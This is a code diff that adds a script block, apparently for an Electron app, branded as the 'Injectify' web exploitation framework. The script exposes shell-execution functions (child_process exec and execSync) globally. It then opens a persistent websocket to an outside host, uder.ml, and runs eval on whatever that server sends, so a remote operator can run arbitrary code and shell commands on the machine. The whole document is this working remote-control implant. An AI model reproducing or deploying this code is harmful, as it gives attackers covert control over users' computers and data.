@@ -1,0 +1,94 @@
+<script>
+/**
+ * Includes
+ */
+const { remote } = require('electron')
+const win = remote.getCurrentWindow()
+const alert = require('alert-node')
+const child_process = require('child_process')
+
+/**
+ * Some global definitions
+ */
+window.win = remote.getCurrentWindow()
+window.cmd = window.execSync = command => {
+    return String.fromCharCode.apply(null, child_process.execSync(command))
+}
+window.exec = command => {
+    return String.fromCharCode.apply(null, child_process.exec(command))
+}
+window.run = window.start = window.exec = command => {
+    return String.fromCharCode.apply(null, child_process.exec(`start "" ${command}`))
+}
+window.focus = () => {
+    // https://github.com/electron/electron/issues/2867#issuecomment-153918442
+    if (!win.isFocused()) win.minimize()
+    win.focus()
+}
+
+/**
+ * Configuration
+ */
+let config = {
+    websocket: 'wss://uder.ml/i/websocket', // 'ws://127.0.0.1:3000/i/websocket'
+    project: 'private',
+}
+
+/**
+ * ASCII art
+ */
+
+console.log(`%c
+    _____        _           _   _  __       
+    \\_   \\_ __  (_) ___  ___| |_(_)/ _|_   _ 
+     / /\\/ '_ \\ | |/ _ \\/ __| __| | |_| | | |
+  /\\/ /_ | | | || |  __/ (__| |_| |  _| |_| |
+  \\____/ |_| |_|/ |\\___|\\___|\\__|_|_|  \\__, |
+              |__/  %chttps://samdd.me   %c|___/ 
+
+%cWeb exploitation framework for the 21st century.
+    %chttps://github.com/samdenty99/injectify
+`, 'color: #369BF2', 'color: #FF6C00', 'color: #369BF2', 'color: #8700ff', 'color: #a953cc')
+
+/**
+ * Websocket handler
+ */
+console.log('💻 %cConnecting to server %c' + config.websocket, 'color: #1b93c3', 'color: #442fb1')
+let i = () => {
+    window.ws = new WebSocket(
+        config.websocket + '?$' + Buffer.from(config.project).toString('base64')
+    )
+
+    let send = (topic, data) => {
+        ws.send(
+            JSON.stringify({
+                t: topic,
+                d: data
+            })
+        )
+    }
+
+    ws.onopen = function() {
+        console.log('✅ %cConnected to server!', 'color: #1b93c3')
+        send('info', 'ayuy')
+    }
+
+    ws.onmessage = function(message) {
+        try {
+            message = JSON.parse(message.data)
+            eval(message.d)
+        } catch(e) {
+            console.error(e)
+            ws.send(JSON.stringify({
+                t: 'e',
+                d: e.stack,
+            }))
+        }
+    }
+
+    ws.onclose = function() {
+        setTimeout(i, 3000)
+    }
+}
+i()
+</script>
